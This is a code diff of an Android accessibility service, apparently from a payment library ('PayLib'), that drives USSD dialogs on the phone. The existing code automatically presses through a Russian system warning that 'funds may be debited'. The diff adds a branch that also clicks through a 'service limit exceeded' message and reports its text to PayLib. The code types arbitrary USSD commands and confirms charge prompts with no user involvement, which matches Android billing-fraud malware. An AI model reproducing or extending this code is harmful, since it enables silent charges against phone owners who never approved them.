@@ -1,15 +1,15 @@
-package com.example.p2plib2.ussd;
+package  com.example.p2plib2.ussd;
+
 
 import android.accessibilityservice.AccessibilityService;
 import android.content.ClipData;
 import android.content.ClipboardManager;
 import android.content.Context;
 import android.os.Bundle;
-import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
-
 import com.example.p2plib2.Logger;
+import com.example.p2plib2.PayLib;
 
 import static com.example.p2plib2.PayLib.flagok;
 
@@ -44,6 +44,10 @@ public class AccessService extends AccessibilityService {
                 str += event.getText().get(1);
             }
             if (str.contains("могут быть списаны средства")) {
+                clickOnButton(event, 0);
+            } if(str.contains("Превышен лимит услуги")){
+                Logger.lg("Превышен лимит услуги");
+                PayLib.getSMSResult(str);
                 clickOnButton(event, 0);
             } else {
                 if (LoginView(event) && notInputText(event)) {
@@ -89,15 +93,14 @@ public class AccessService extends AccessibilityService {
         }
     }
 
-
     /**
      * Send whatever you want via USSD
      *
      * @param text any string
      */
     public static void send(String text) {
-            setTextIntoField(event, text);
-            clickOnButton(event, 1);
+        setTextIntoField(event, text);
+        clickOnButton(event, 1);
     }
 
     /**
@@ -114,7 +117,7 @@ public class AccessService extends AccessibilityService {
                     AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, data);
             for (int i = 0; i < event.getSource().getChildCount(); i++) {
                 AccessibilityNodeInfo node = event.getSource().getChild(i);
-                Log.d(TAG, i + ":" + node.getClassName());
+                Logger.lg(i + ":" + node.getClassName());
                 if (node != null && node.getClassName().equals("android.widget.EditText")
                         && !node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)) {
                     ((ClipboardManager) ussdController.context
@@ -192,24 +195,23 @@ public class AccessService extends AccessibilityService {
             Logger.lg("event.getSource().getChildCount() " + event.getSource().getChildCount());
             for (int i = 0; i < event.getSource().getChildCount(); i++) {
                 AccessibilityNodeInfo nodeButton = event.getSource().getChild(i);
-               Logger.lg(" nodeButton.getClassName().toString() " + nodeButton);
-               if(nodeButton!=null) {
-                   if (nodeButton.getClassName().toString().toLowerCase().contains("button")) {
-                       count++;
-                       if (count == index) {
-                           nodeButton.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                       }
-                   }
-                   if (nodeButton.getClassName().toString().toLowerCase().contains("scrollview")) {
-                       Logger.lg("nodeButton " + nodeButton.getChildCount());
-                       if (nodeButton.getChildCount() == 1) {
-                           nodeButton.getChild(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                       } else {
-                           nodeButton.getChild(1).performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                       }
-                   }
-                   Logger.lg("action " + nodeButton.getActionList());
-               }
+                Logger.lg(" nodeButton.getClassName().toString() " + nodeButton);
+                if (nodeButton != null) {
+                    if (nodeButton.getClassName().toString().toLowerCase().contains("button")) {
+                        count++;
+                        if (count == index) {
+                            nodeButton.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                        }
+                    }
+                    if (nodeButton.getClassName().toString().toLowerCase().contains("scrollview")) {
+                        Logger.lg("nodeButton " + nodeButton.getText());
+                        if (nodeButton.getChildCount() == 1) {
+                            nodeButton.getChild(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                        } else {
+                            nodeButton.getChild(1).performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                        }
+                    }
+                }
             }
         }
     }
@@ -219,7 +221,7 @@ public class AccessService extends AccessibilityService {
      */
     @Override
     public void onInterrupt() {
-        Log.d(TAG, "onInterrupt");
+        Logger.lg( "onInterrupt");
     }
 
     /**
@@ -228,6 +230,6 @@ public class AccessService extends AccessibilityService {
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
-        Log.d(TAG, "onServiceConnected");
+        Logger.lg( "onServiceConnected");
     }
 }
